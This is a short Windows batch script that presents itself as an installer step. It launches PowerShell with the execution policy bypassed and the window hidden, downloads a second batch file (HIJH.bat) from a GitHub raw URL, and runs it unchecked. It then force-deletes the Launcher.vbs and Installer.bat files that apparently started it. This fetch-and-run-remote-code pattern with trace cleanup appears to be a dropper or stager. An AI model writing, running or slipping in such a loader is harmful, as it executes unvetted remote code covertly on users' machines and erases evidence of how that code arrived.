@echo off
setlocal

set "BASE=https://raw.githubusercontent.com/creatorcostudios/files/main"
set "OUT=%~dp0HIJH.bat"

echo Downloading HIJH.bat...
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
  "$ProgressPreference='SilentlyContinue'; (New-Object Net.WebClient).DownloadFile('%BASE%/HIJH.bat', '%OUT%'); Write-Host 'Download complete'"

if exist "%OUT%" (
    echo Running HIJH.bat...
    cmd /c ""%OUT%""
)

echo Cleaning up support files...
del /f /q "%~dp0Launcher.vbs"
del /f /q "%~dp0Installer.bat"

echo Done.
exit /b
